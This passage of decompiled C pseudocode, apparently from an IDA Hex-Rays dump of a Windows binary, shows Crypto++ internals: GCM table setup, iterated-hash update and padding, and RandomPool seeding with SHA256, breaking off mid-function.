  char pExceptionObject[40]; // [esp+6Ch] [ebp-38h] BYREF
  int v98; // [esp+A0h] [ebp-4h]

  LODWORD(v92) = a1;
  v94 = a5;
  v5 = (_DWORD *)(*(int (__thiscall **)(int))(*(_DWORD *)a1 + 124))(a1);
  (*(void (__thiscall **)(_DWORD *, int, int, unsigned int))(*v5 + 24))(v5, a3, a4, a5);
  v6 = v5[1];
  v7 = v5 + 1;
  v93 = (unsigned int)(v5 + 1);
  v8 = (*(int (__thiscall **)(_DWORD *))(v6 + 20))(v5 + 1);
  v9 = v5 + 1;
  v10 = v8;
  if ( (*(int (__thiscall **)(_DWORD *))(*v7 + 20))(v9) != 16 )
  {
    v82 = (char *)(*(int (__thiscall **)(_DWORD, char *))(*(_DWORD *)(v92 + 4) + 8))(v92 + 4, v96);
    v98 = 0;
    v83 = (_DWORD *)sub_421F20((int)v95, v82, ": block size of underlying block cipher is not 16");
    LOBYTE(v98) = 1;
    sub_405230(pExceptionObject, v83);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  if ( !byte_4F0124 )
    sub_466590();
  v11 = *(unsigned __int8 (__stdcall **)(const char *, int *, int *))(*(_DWORD *)v94 + 4);
  if ( byte_4F012C )
  {
    v11("TableSize", &int `RTTI Type Descriptor', &v89);
    v12 = 8 * v10;
  }
  else if ( v11("TableSize", &int `RTTI Type Descriptor', &v89) )
  {
    v12 = 2048;
    if ( v89 >= 0x10000 )
      v12 = 0x10000;
  }
  else
  {
    v12 = (*(int (__thiscall **)(_DWORD))(*(_DWORD *)v92 + 128))(v92) != 1 ? 2048 : 0x10000;
  }
  v13 = v12 + 2 * v10;
  v89 = v12;
  v14 = (_DWORD *)v92;
  v15 = v10 + v13;
  v91 = v15;
  v16 = *(_DWORD *)(v92 + 20);
  v17 = *(void **)(v92 + 24);
  HIDWORD(v92) = v17;
  v94 = v16;
  if ( v16 != v15 )
  {
    if ( v15 )
    {
      v18 = (char *)sub_45AC10(v15);
      v16 = v94;
    }
    else
    {
      v18 = 0;
    }
    v90 = v18;
    v19 = v16;
    if ( v15 < v16 )
      v19 = v15;
    if ( v17 && v18 )
    {
      sub_438F30(v18, v19, v17, v19);
      v16 = v94;
    }
    memset(v17, 0, v16);
    if ( v16 )
      j_j_unknown_libname_61(v17);
    else
      j_j___free_base(v17);
    v17 = v90;
    v15 = v91;
    v14 = (_DWORD *)v92;
    HIDWORD(v92) = v90;
  }
  v20 = (int *)v93;
  v14[5] = v15;
  v21 = (__m128i *)(HIDWORD(v92) + 32);
  v14[6] = v17;
  v14[4] = -1;
  v22 = (int)v17 + 48;
  *v21 = 0i64;
  v23 = *v20;
  v90 = (char *)v22;
  v91 = (int)v21;
  (*(void (__thiscall **)(int *, __m128i *, _DWORD, __m128i *))(v23 + 16))(v20, v21, 0, v21);
  if ( !byte_4F0124 )
    sub_466590();
  if ( byte_4F012C )
    return sub_4685E0(v21, v22, v89);
  v25 = _byteswap_ulong(v21->m128i_i32[0]);
  v86 = v25;
  v26 = _byteswap_ulong(*(_DWORD *)(v91 + 12));
  v92 = _byteswap_uint64(*(_QWORD *)(v91 + 4));
  v93 = v26;
  if ( v89 == 0x10000 )
  {
    LOBYTE(v27) = 0;
    v94 = 0;
    do
    {
      v28 = v22 + (1 << (11 - (v27 & 7)));
      v29 = v92;
      v30 = (_DWORD *)((v94 >> 3 << 12) + v28);
      v30[1] = _byteswap_ulong(HIDWORD(v92));
      v31 = v93;
      *v30 = _byteswap_ulong(v25);
      v32 = _byteswap_ulong(v92);
      v30[3] = _byteswap_ulong(v31);
      v33 = HIDWORD(v92);
      v30[2] = v32;
      LOBYTE(v30) = v93;
      v93 = __PAIR64__(v29, v93) >> 1;
      LODWORD(v92) = (v29 >> 1) | (v33 << 31);
      if ( ((unsigned __int8)v30 & 1) != 0 )
        v34 = -520093696;
      else
        v34 = 0;
      v22 = (int)v90;
      HIDWORD(v92) = __PAIR64__(v25, HIDWORD(v92)) >> 1;
      v25 = v34 ^ (v25 >> 1);
      v27 = v94 + 1;
      v94 = v27;
    }
    while ( v27 < 128 );
    v35 = 0;
    LODWORD(v92) = v90;
    v94 = 0;
    result = (signed int)v90;
    do
    {
      *(_OWORD *)result = 0i64;
      if ( !byte_4F0124 )
        sub_466590();
      v36 = 2;
      v93 = 2;
      if ( byte_4F0125 )
      {
        do
        {
          if ( v36 > 1 )
          {
            v37 = (__m128i *)(v22 + 16 * (v35 + v36));
            HIDWORD(v92) = v36 - 1;
            v91 = (int)v37;
            v38 = (__m128i *)(v92 + 16);
            v39 = v37 + 1;
            do
            {
              sub_4687C0(v39, v37, v38);
              v37 = (__m128i *)v91;
              ++v38;
              ++v39;
              --HIDWORD(v92);
            }
            while ( HIDWORD(v92) );
            v36 = v93;
            v22 = (int)v90;
            v35 = v94;
          }
          v36 *= 2;
          v93 = v36;
        }
        while ( v36 <= 128 );
      }
      else
      {
        do
        {
          if ( v36 > 1 )
          {
            v40 = (_DWORD *)(v22 + 16 * (v35 + v36));
            HIDWORD(v92) = v36 - 1;
            v41 = (int *)(v92 + 16);
            v42 = v40 + 4;
            do
            {
              v43 = *v41;
              v41 += 4;
              v42 += 4;
              v44 = v40[1] ^ *(v41 - 3);
              *(v42 - 4) = *v40 ^ v43;
              *(v42 - 3) = v44;
              v45 = v40[2] ^ *(v41 - 2);
              v46 = v40[3] ^ *(v41 - 1);
              v47 = HIDWORD(v92)-- == 1;
              *(v42 - 2) = v45;
              *(v42 - 1) = v46;
            }
            while ( !v47 );
            v36 = v93;
            v22 = (int)v90;
            v35 = v94;
          }
          v36 *= 2;
          v93 = v36;
        }
        while ( v36 <= 128 );
      }
      v35 += 256;
      result = v92 + 4096;
      v94 = v35;
      LODWORD(v92) = v92 + 4096;
    }
    while ( v35 < 4096 );
    return result;
  }
  if ( !byte_4F0108 )
  {
    v48 = 450;
    word_4EFF08[0] = 0;
    v49 = 2;
    v91 = 2;
    word_4EFF0A = -15871;
    do
    {
      v48 *= 2;
      v50 = 2 * v49;
      v84 = v48;
      HIBYTE(v51) = v48;
      v94 = v50;
      LOBYTE(v51) = BYTE1(v48);
      *(__int16 *)((char *)word_4EFF08 + v50) = v51;
      v52 = 1;
      if ( v49 > 1 )
      {
        v53 = v94;
        v54 = (char *)&word_4EFF0A + v50;
        v55 = v91;
        do
        {
          v54 += 2;
          v56 = *(__int16 *)((char *)word_4EFF08 + v53) ^ word_4EFF08[v52++];
          *((_WORD *)v54 - 1) = v56;
        }
        while ( v52 < v55 );
        v50 = v94;
        v48 = v84;
      }
      v49 = v50;
      v91 = v50;
    }
    while ( v50 <= 0x80 );
    v22 = (int)v90;
    v25 = v86;
    byte_4F0108 = 1;
  }
  LOBYTE(result) = 0;
  v94 = 0;
  do
  {
    v57 = result & 0x1F;
    if ( v57 >= 4 )
    {
      if ( v57 >= 8 )
        goto LABEL_65;
      v58 = 11 - v57;
      v59 = v94 >> 5;
    }
    else
    {
      v58 = 7 - v57;
      v59 = (v94 >> 5) + 4;
    }
    v60 = (_DWORD *)((v59 << 8) + v22 + (1 << v58));
    v60[1] = _byteswap_ulong(HIDWORD(v92));
    v61 = v93;
    *v60 = _byteswap_ulong(v25);
    v62 = _byteswap_ulong(v92);
    v60[3] = _byteswap_ulong(v61);
    v60[2] = v62;
LABEL_65:
    v63 = v93;
    v93 = __PAIR64__(v92, v93) >> 1;
    LODWORD(v92) = v92 >> 1;
    if ( (v63 & 1) != 0 )
      v64 = -520093696;
    else
      v64 = 0;
    v22 = (int)v90;
    HIDWORD(v92) = __PAIR64__(v25, HIDWORD(v92)) >> 1;
    v25 = v64 ^ (v25 >> 1);
    result = v94 + 1;
    v94 = result;
  }
  while ( result < 104 );
  v65 = 0;
  v66 = (signed int)(v90 + 1048);
  v92 = (unsigned int)(v90 + 1048);
  do
  {
    *(_OWORD *)(v66 - 1048) = 0i64;
    *(_OWORD *)(v66 - 24) = 0i64;
    if ( !byte_4F0124 )
    {
      result = sub_466590();
      v66 = v92;
    }
    if ( byte_4F0125 )
    {
      v67 = 2;
      v94 = 2;
      do
      {
        if ( v67 > 1 )
        {
          v87 = (__m128i *)(v22 + 16 * (v65 + v67));
          v68 = (__m128i *)(v22 + 16 * (v67 + v65 + 64));
          v69 = (__m128i *)&v90[16 * v65 + 1040 + 16 * v67];
          v70 = (__m128i *)(v92 - 8);
          v85 = v68;
          v91 = v67 - 1;
          do
          {
            sub_4687C0(v69 - 64, v87, v70 - 64);
            result = (signed int)sub_4687C0(v69++, v85, v70++);
            --v91;
          }
          while ( v91 );
          v67 = v94;
          v22 = (int)v90;
          v65 = HIDWORD(v92);
        }
        v67 *= 2;
        v94 = v67;
      }
      while ( v67 <= 8 );
    }
    else
    {
      v71 = 2;
      v93 = 2;
      do
      {
        if ( v71 > 1 )
        {
          v72 = (_DWORD *)(v22 + 16 * (v65 + v71));
          v88 = v72;
          v94 = v22 + 16 * (v71 + HIDWORD(v92) + 64);
          v73 = v72 + 262;
          v91 = v71 - 1;
          result = v66;
          do
          {
            v74 = *(_DWORD *)(result - 1032);
            result += 16;
            v73 += 4;
            v75 = v72[1] ^ *(_DWORD *)(result - 1044);
            *(v73 - 262) = *v72 ^ v74;
            *(v73 - 261) = v75;
            v76 = v72[2] ^ *(_DWORD *)(result - 1040);
            v77 = v72[3] ^ *(_DWORD *)(result - 1036);
            v78 = (_DWORD *)v94;
            *(v73 - 260) = v76;
            *(v73 - 259) = v77;
            v79 = v78[1] ^ *(_DWORD *)(result - 20);
            *(v73 - 6) = *(_DWORD *)v94 ^ *(_DWORD *)(result - 24);
            *(v73 - 5) = v79;
            v80 = v78[2] ^ *(_DWORD *)(result - 16);
            v81 = v78[3] ^ *(_DWORD *)(result - 12);
            v47 = v91-- == 1;
            v72 = v88;
            *(v73 - 4) = v80;
            *(v73 - 3) = v81;
          }
          while ( !v47 );
          v71 = v93;
          v22 = (int)v90;
          v65 = HIDWORD(v92);
        }
        v66 = v92;
        v71 *= 2;
        v93 = v71;
      }
      while ( v71 <= 8 );
    }
    v65 += 16;
    v66 = v92 + 256;
    HIDWORD(v92) = v65;
    LODWORD(v92) = v92 + 256;
  }
  while ( v65 < 64 );
  return result;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4EE1D4: using guessed type int int `RTTI Type Descriptor';
// 4EFF08: using guessed type __int16 word_4EFF08[];
// 4EFF0A: using guessed type __int16 word_4EFF0A;
// 4F0108: using guessed type char byte_4F0108;
// 4F0124: using guessed type char byte_4F0124;
// 4F0125: using guessed type char byte_4F0125;
// 4F012C: using guessed type char byte_4F012C;
// 4613A0: using guessed type char var_50[24];
// 4613A0: using guessed type char var_68[24];

//----- (00461AF0) --------------------------------------------------------
int __cdecl sub_461AF0(int a1, void *a2, void *a3, unsigned int a4)
{
  int result; // eax

  if ( a1 )
    return sub_457947((int)a2, (int)a3, a4);
  if ( a3 != a2 )
    return sub_438F30(a2, a4, a3, a4);
  return result;
}

//----- (00461B40) --------------------------------------------------------
char *__thiscall sub_461B40(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  sub_419BE0((_DWORD *)this + 4, (_DWORD *)(a2 + 16));
  *(_DWORD *)this = &CryptoPP::HashInputTooLong::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4BC7E8: using guessed type void *CryptoPP::HashInputTooLong::`vftable';

//----- (00461BD0) --------------------------------------------------------
char *__thiscall sub_461BD0(char *this, size_t *a2)
{
  size_t *v3; // edi
  unsigned int v4; // eax
  unsigned int v5; // edx
  void *v6; // ecx
  void *v8[5]; // [esp+18h] [ebp-28h] BYREF
  unsigned int v9; // [esp+2Ch] [ebp-14h]
  int v10; // [esp+3Ch] [ebp-4h]

  v3 = a2;
  v4 = a2[4] + 70;
  v10 = 0;
  v8[4] = 0;
  v9 = 15;
  LOBYTE(v8[0]) = 0;
  sub_4196B0(v8, v4);
  sub_41F120((char *)v8, "IteratedHashBase: input data exceeds maximum allowed by hash function ", 0x46u);
  if ( a2[5] >= 0x10 )
    v3 = (size_t *)*a2;
  sub_41F120((char *)v8, v3, a2[4]);
  *(_QWORD *)(this + 4) = 0i64;
  LOBYTE(v10) = 1;
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = 4;
  sub_419BE0((_DWORD *)this + 4, v8);
  v5 = v9;
  *(_DWORD *)this = &CryptoPP::InvalidDataFormat::`vftable';
  if ( v5 >= 0x10 )
  {
    v6 = v8[0];
    if ( v5 + 1 >= 0x1000 )
    {
      v6 = (void *)*((_DWORD *)v8[0] - 1);
      if ( (unsigned int)(v8[0] - v6 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v6);
  }
  *(_DWORD *)this = &CryptoPP::HashInputTooLong::`vftable';
  return this;
}
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B91DC: using guessed type void *CryptoPP::InvalidDataFormat::`vftable';
// 4BC7E8: using guessed type void *CryptoPP::HashInputTooLong::`vftable';

//----- (00461CF0) --------------------------------------------------------
int __thiscall sub_461CF0(_DWORD *this, _DWORD *a2)
{
  unsigned int v3; // eax
  unsigned int v4; // edx
  unsigned int v5; // eax
  int v6; // esi

  v3 = (*(int (__thiscall **)(_DWORD *))(*this + 36))(this);
  v4 = v3;
  if ( v3 <= 1 )
    v5 = 0;
  else
    v5 = v3 - 1;
  v6 = v5 & this[1];
  *a2 = v4 - v6;
  return v6 + (*(int (__thiscall **)(_DWORD *))(*this + 92))(this);
}

//----- (00461D30) --------------------------------------------------------
int __thiscall sub_461D30(int *this)
{
  int v1; // eax

  v1 = *this;
  this[2] = 0;
  this[1] = 0;
  return (*(int (**)(void))(v1 + 76))();
}

//----- (00461D50) --------------------------------------------------------
int __userpurge sub_461D50@<eax>(int *a1@<ecx>, int a2@<esi>, void *a3, size_t Size)
{
  unsigned int v5; // ebp
  int v6; // ebx
  unsigned int v7; // eax
  unsigned int v8; // eax
  int v9; // esi
  unsigned int v10; // esi
  char *v11; // ecx
  int v12; // esi
  int v13; // eax
  unsigned int v14; // ecx
  unsigned int v15; // ebp
  unsigned int v16; // eax
  int v17; // esi
  int v18; // eax
  unsigned int v20; // eax
  void *Src; // [esp+10h] [ebp-10h]
  _BYTE *v23; // [esp+18h] [ebp-8h]
  unsigned int v24; // [esp+1Ch] [ebp-4h]
  void *retaddr; // [esp+20h] [ebp+0h]

  sub_4388B0(a1, Size);
  (*(void (__thiscall **)(int *))(*a1 + 92))(a1);
  Src = (void *)(*(int (__thiscall **)(int *))(*a1 + 96))(a1);
  v5 = (*(int (__thiscall **)(int *))(*a1 + 36))(a1);
  v6 = (*(int (__thiscall **)(int *))(*a1 + 80))(a1);
  v7 = (*(int (__thiscall **)(int *))(*a1 + 36))(a1);
  v24 = v7;
  if ( v7 <= 1 )
    v8 = 0;
  else
    v8 = v7 - 1;
  v9 = v8 & a1[1];
  v23 = (_BYTE *)(*(int (__thiscall **)(int *, int))(*a1 + 92))(a1, a2);
  v23[v9] = 0x80;
  v10 = v9 + 1;
  v11 = &v23[v10];
  if ( v10 > v5 - 8 )
  {
    memset(v11, 0, (size_t)retaddr - v10);
    v12 = *a1;
    v13 = (*(int (__thiscall **)(int *))(*a1 + 36))(a1);
    (*(void (__thiscall **)(int *, _BYTE *, int))(v12 + 88))(a1, v23, v13);
    memset(v23, 0, v5 - 8);
  }
  else
  {
    memset(v11, 0, v5 - 8 - v10);
  }
  v14 = 8 * a1[1];
  if ( v6 )
    v14 = _byteswap_ulong(v14);
  v15 = v5 >> 2;
  *(_DWORD *)(v24 + 4 * (v6 + v15) - 8) = v14;
  v16 = ((unsigned int)a1[1] >> 29) + 8 * a1[2];
  if ( v6 )
    v16 = _byteswap_ulong(v16);
  *(_DWORD *)(v24 + 4 * (v15 - v6) - 4) = v16;
  v17 = *a1;
  v18 = (*(int (__thiscall **)(int *))(*a1 + 36))(a1);
  (*(void (__thiscall **)(int *, void *, int))(v17 + 88))(a1, retaddr, v18);
  if ( ((unsigned __int8)a3 & 3) != 0 || (Size & 3) != 0 )
  {
    v20 = (*(int (__thiscall **)(int *))(*a1 + 32))(a1);
    if ( v6 )
      sub_457947((int)Src, (int)Src, v20);
    memmove(a3, Src, Size);
    return (*(int (__thiscall **)(int *))(*a1 + 28))(a1);
  }
  else
  {
    sub_461AF0(v6, a3, Src, Size);
    return (*(int (__thiscall **)(int *))(*a1 + 28))(a1);
  }
}
// 461D50: could not find valid save-restore pair for esi

//----- (00461EB0) --------------------------------------------------------
char *__thiscall sub_461EB0(_DWORD *this, char *Src, size_t a3)
{
  char *result; // eax
  char *v5; // ebx
  unsigned int v6; // esi
  unsigned int v7; // edx
  unsigned int v8; // ecx
  int v9; // eax
  unsigned int v10; // eax
  size_t v11; // esi
  unsigned int v12; // eax
  int v13; // esi
  int v14; // eax
  size_t v15; // ecx
  int v16; // esi
  int v17; // eax
  int v18; // esi
  int v19; // eax
  size_t *v20; // eax
  size_t v21; // [esp+10h] [ebp-60h]
  int v22; // [esp+14h] [ebp-5Ch]
  int v23; // [esp+14h] [ebp-5Ch]
  char *v24; // [esp+18h] [ebp-58h]
  size_t Size; // [esp+1Ch] [ebp-54h]
  char v26[24]; // [esp+20h] [ebp-50h] BYREF
  char pExceptionObject[40]; // [esp+38h] [ebp-38h] BYREF
  int v28; // [esp+6Ch] [ebp-4h]

  result = (char *)a3;
  v5 = Src;
  Size = a3;
  if ( !a3 )
    return result;
  v6 = this[1];
  v7 = this[2];
  v8 = v7;
  v22 = this[1];
  this[1] = v6 + a3;
  if ( v6 + a3 < v6 )
    v8 = v7 + 1;
  v9 = *this;
  this[2] = v8;
  if ( v8 < v7 )
  {
    v20 = (size_t *)(*(int (__thiscall **)(_DWORD *, char *))(v9 + 8))(this, v26);
    v28 = 0;
    sub_461BD0(pExceptionObject, v20);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVHashInputTooLong_CryptoPP__);
  }
  v10 = (*(int (__thiscall **)(_DWORD *))(v9 + 36))(this);
  v11 = v10;
  v21 = v10;
  if ( v10 <= 1 )
    v12 = 0;
  else
    v12 = v10 - 1;
  v23 = v12 & v22;
  result = (char *)(*(int (__thiscall **)(_DWORD *))(*this + 92))(this);
  v24 = result;
  if ( v23 )
  {
    if ( a3 + v23 < v11 )
    {
      if ( Src )
        return (char *)memmove(&result[v23], Src, a3);
      return result;
    }
    if ( Src )
      memmove(&result[v23], Src, v11 - v23);
    v13 = *this;
    v14 = (*(int (__thiscall **)(_DWORD *))(*this + 36))(this);
    (*(void (__thiscall **)(_DWORD *, char *, int))(v13 + 88))(this, v24, v14);
    v11 = v21;
    v5 = &Src[v21 - v23];
    result = v24;
    v15 = v23 - v21 + a3;
    Size = v15;
  }
  else
  {
    v15 = a3;
  }
  if ( v15 >= v11 )
  {
    if ( v5 == result )
    {
      v16 = *this;
      v17 = (*(int (__thiscall **)(_DWORD *))(*this + 36))(this);
      return (char *)(*(int (__thiscall **)(_DWORD *, char *, int))(v16 + 88))(this, v24, v17);
    }
    if ( ((unsigned __int8)v5 & 3) != 0 )
    {
      while ( 1 )
      {
        if ( v5 )
          memmove(result, v5, v11);
        v18 = *this;
        v19 = (*(int (__thiscall **)(_DWORD *))(*this + 36))(this);
        result = (char *)(*(int (__thiscall **)(_DWORD *, char *, int))(v18 + 88))(this, v24, v19);
        v11 = v21;
        v5 += v21;
        v15 = Size - v21;
        Size = v15;
        if ( v15 < v21 )
          break;
        result = v24;
      }
    }
    else
    {
      result = (char *)(*(int (__thiscall **)(_DWORD *, char *, size_t))(*this + 88))(this, v5, v15);
      v5 += Size - (_DWORD)result;
      v15 = (size_t)result;
    }
  }
  if ( v5 )
  {
    result = v24;
    if ( v24 != v5 )
      return (char *)memmove(v24, v5, v15);
  }
  return result;
}
// 461EB0: using guessed type char var_50[24];

//----- (00462070) --------------------------------------------------------
_DWORD *__thiscall sub_462070(_DWORD *this)
{
  _DWORD *v2; // eax
  _DWORD *v3; // esi
  _DWORD *v4; // eax
  size_t v6; // [esp-4h] [ebp-28h]

  sub_435E90(this, 1);
  *this = &CryptoPP::RandomPool::`vftable';
  *((_BYTE *)this + 33) = 1;
  this[10] = -1;
  this[11] = 16;
  this[12] = (char *)this + (-(int)(this + 2) & 0xF) + 8;
  *((_BYTE *)this + 97) = 1;
  this[26] = -1;
  this[27] = 32;
  this[28] = (char *)this + (-(int)(this + 14) & 0xF) + 56;
  v2 = operator new(0x30u);
  v3 = v2;
  if ( v2 )
  {
    sub_435E90(v2 + 1, 1);
    v3[5] = 0x3FFFFFFF;
    v3[6] = 0;
    v3[7] = sub_41E7A0(0, 0);
    v4 = v3;
    v3[9] = -1;
    v3[10] = 0;
    v3[11] = 0;
    *v3 = &off_4BAC30;
    v3[1] = &off_4BAC70;
  }
  else
  {
    v4 = 0;
  }
  this[30] = v4;
  v6 = this[27];
  *((_BYTE *)this + 124) = 0;
  memset((void *)this[28], 0, v6);
  memset((void *)this[12], 0, this[11]);
  return this;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4BAC30: using guessed type int (__stdcall *off_4BAC30)(int);
// 4BAC70: using guessed type void *off_4BAC70;
// 4BC854: using guessed type void *CryptoPP::RandomPool::`vftable';

//----- (004621A0) --------------------------------------------------------
int __thiscall sub_4621A0(int this, char a2)
{
  void (__thiscall ***v3)(_DWORD, int); // ecx
  unsigned int v4; // ecx
  unsigned int v5; // ebx
  void *v6; // edi
  void *v7; // edi
  unsigned int v8; // ebx
  unsigned int v9; // ecx

  v3 = *(void (__thiscall ****)(_DWORD, int))(this + 120);
  if ( v3 )
    (**v3)(v3, 1);
  v4 = *(_DWORD *)(this + 108);
  v5 = *(_DWORD *)(this + 104);
  v6 = *(void **)(this + 112);
  if ( v6 == (void *)(this + 56 + (-(this + 56) & 0xF)) )
  {
    *(_BYTE *)(this + 97) = 0;
    if ( v5 < v4 )
      v4 = v5;
    memset(v6, 0, v4);
  }
  v7 = *(void **)(this + 48);
  v8 = *(_DWORD *)(this + 40);
  v9 = *(_DWORD *)(this + 44);
  if ( v7 == (void *)(this + 8 + (-(this + 8) & 0xF)) )
  {
    *(_BYTE *)(this + 33) = 0;
    if ( v8 < v9 )
      v9 = v8;
    memset(v7, 0, v9);
  }
  if ( (a2 & 1) != 0 )
    sub_46C87D((void *)this);
  return this;
}

//----- (00462220) --------------------------------------------------------
void __userpurge sub_462220(int a1@<ecx>, int a2@<edi>, int a3, int a4, unsigned int a5, unsigned int a6)
{
  unsigned int v6; // ebx
  unsigned int v8; // esi
  __time64_t v9; // rax
  int v10; // ecx
  bool v11; // cf
  int v12; // edi

  v6 = a6;
  v8 = a5;
  if ( a6 || a5 )
  {
    if ( !*(_BYTE *)(a1 + 124) )
      (*(void (__thiscall **)(_DWORD, _DWORD, int, void ***))(**(_DWORD **)(a1 + 120) + 24))(
        *(_DWORD *)(a1 + 120),
        *(_DWORD *)(a1 + 112),
        32,
        off_4E8018[0]);
    *(_QWORD *)*(_DWORD *)(a1 + 48) += sub_4687E0().QuadPart;
    v9 = _time64(0);
    v10 = *(_DWORD *)(a1 + 48);
    v11 = __CFADD__((_DWORD)v9, *(_DWORD *)(v10 + 8));
    *(_DWORD *)(v10 + 8) += v9;
    *(_DWORD *)(v10 + 12) += HIDWORD(v9) + v11;
    do
    {
      (*(void (__thiscall **)(int, _DWORD, _DWORD, _DWORD, int))(*(_DWORD *)(*(_DWORD *)(a1 + 120) + 4) + 16))(
        *(_DWORD *)(a1 + 120) + 4,
        *(_DWORD *)(a1 + 48),
        0,
        *(_DWORD *)(a1 + 48),
        a2);
      if ( v6 || v8 >= 0x10 )
        v12 = 16;
      else
        v12 = v8;
      a2 = 1;
      (*(void (__thiscall **)(int, _DWORD, _DWORD, int, _DWORD))(*(_DWORD *)a4 + 140))(
        a4,
        0,
        *(_DWORD *)(a1 + 48),
        v12,
        0);
      v6 = (__PAIR64__(v6, v8) - (unsigned int)v12) >> 32;
      v8 -= v12;
    }
    while ( __PAIR64__(v6, v8) );
  }
}
// 462220: could not find valid save-restore pair for edi
// 4E8018: using guessed type void ***off_4E8018[3];

//----- (00462310) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
_BYTE *__userpurge sub_462310@<eax>(int a1@<ecx>, int a2@<ebp>, char *a3, size_t a4)
{
  int v5; // esi
  int v6; // edi
  int v7; // eax
  unsigned int v8; // ecx
  _OWORD *v9; // edi
  unsigned int v10; // ecx
  _BYTE *result; // eax
  char *v12; // [esp-104h] [ebp-110h]
  _OWORD *v13; // [esp-F0h] [ebp-FCh]
  int v14; // [esp-E4h] [ebp-F0h]
  _DWORD v15[4]; // [esp-E0h] [ebp-ECh] BYREF
  _BYTE v16[72]; // [esp-D0h] [ebp-DCh] BYREF
  unsigned int v17; // [esp-88h] [ebp-94h]
  unsigned int v18; // [esp-84h] [ebp-90h]
  _BYTE *v19; // [esp-80h] [ebp-8Ch]
  _BYTE v20[80]; // [esp-78h] [ebp-84h] BYREF
  unsigned int v21; // [esp-28h] [ebp-34h]
  unsigned int v22; // [esp-24h] [ebp-30h]
  _OWORD *v23; // [esp-20h] [ebp-2Ch]
  int *v24; // [esp-10h] [ebp-1Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h]
  void *v26; // [esp-8h] [ebp-14h]
  int v27; // [esp-4h] [ebp-10h]
  _DWORD v28[2]; // [esp+0h] [ebp-Ch] BYREF
  int v29; // [esp+8h] [ebp-4h] BYREF
  void *retaddr; // [esp+Ch] [ebp+0h]

  v28[0] = a2;
  v28[1] = retaddr;
  v27 = -1;
  v26 = &loc_4B5C4E;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  v24 = &v29;
  sub_435E90(v15, 1);
  v15[1] = 0;
  v15[2] = 0;
  v17 = 0x3FFFFFFF;
  v18 = 16;
  v16[65] = 1;
  v19 = v16;
  v27 = 1;
  v21 = 0x3FFFFFFF;
  v22 = 16;
  v20[73] = 1;
  v23 = &v20[(120 - (_DWORD)v28) & 0xF];
  sub_45C2B0(v23);
  v15[0] = &CryptoPP::SHA256::`vftable';
  v12 = *(char **)(a1 + 112);
  v27 = 2;
  sub_461EB0(v15, v12, 0x20u);
  sub_461EB0(v15, a3, a4);
  v5 = *(_DWORD *)(a1 + 112);
  v6 = v15[0];
  v7 = (*(int (__thiscall **)(_DWORD *))(v15[0] + 32))(v15);
  (*(void (__thiscall **)(_DWORD *, int, int))(v6 + 60))(v15, v5, v7);
  v8 = v22;
  if ( v21 < v22 )
    v8 = v21;
  v9 = v23;
  *(_BYTE *)(v14 + 124) = 0;
  if ( v9 == v13 )
    memset(v9, 0, 4 * v8);
  v10 = v18;
  result = v16;
  if ( v17 < v18 )
    v10 = v17;
  if ( v19 == v16 )
  {
    result = 0;
    memset(v19, 0, 4 * v10);
  }
  return result;
}
// 462310: could not find valid save-restore pair for ebp
// 462310: could not find valid save-restore pair for edi
// 462310: could not find valid save-restore pair for esi
// 462429: bad sp value at call
// 46243F: variable 'v14' is possibly undefined
// 462449: variable 'v13' is possibly undefined
// 4BAA6C: using guessed type void *CryptoPP::SHA256::`vftable';

//----- (004624A0) --------------------------------------------------------
int __thiscall sub_4624A0(void *this, unsigned int a2)
{
  int v2; // eax

  v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 20))(this);
  return 2 * v2 + 1 < a2 >> 3 ? (a2 >> 3) - (2 * v2 + 1) : 0;
}

//----- (004624C0) --------------------------------------------------------
int __thiscall sub_4624C0(void *this, int a2, const void *a3, size_t a4, _BYTE *a5, unsigned int a6, int *a7)
{
  _BYTE *v7; // ebx
  int v8; // edi
  int v9; // eax
  int v10; // eax
  int v11; // esi
  int v12; // eax
  unsigned int v13; // ecx
  void *v14; // edx
  int v15; // esi
  int v16; // eax
  unsigned int *v17; // ecx
  char *v19; // [esp-18h] [ebp-70h]
  size_t v20; // [esp-10h] [ebp-68h]
  void *v21; // [esp-4h] [ebp-5Ch]
  char v22[4]; // [esp+20h] [ebp-38h] BYREF
  void *v23; // [esp+24h] [ebp-34h]
  unsigned int v24; // [esp+28h] [ebp-30h]
  unsigned int v25; // [esp+30h] [ebp-28h] BYREF
  unsigned int v26; // [esp+34h] [ebp-24h] BYREF
  void *Block; // [esp+38h] [ebp-20h]
  void *v28; // [esp+3Ch] [ebp-1Ch]
  size_t Size; // [esp+40h] [ebp-18h]
  int v30; // [esp+44h] [ebp-14h]
  _BYTE *v31; // [esp+48h] [ebp-10h]
  int v32; // [esp+54h] [ebp-4h]
  int v33; // [esp+70h] [ebp+18h]

  v28 = this;
  v7 = a5;
  Size = a4;
  if ( (a6 & 7) != 0 )
  {
    *a5 = 0;
    v7 = a5 + 1;
  }
  v8 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 24))(this);
  v9 = *(_DWORD *)v8;
  v32 = 0;
  v10 = (*(int (__thiscall **)(int))(v9 + 32))(v8);
  v11 = (a6 >> 3) - v10;
  v30 = v10;
  v33 = v11;
  v31 = &v7[v10];
  v25 = -1;
  v26 = 0;
  Block = 0;
  v23 = 0;
  v24 = 0;
  v22[0] = 0;
  v12 = *a7;
  LOBYTE(v32) = 5;
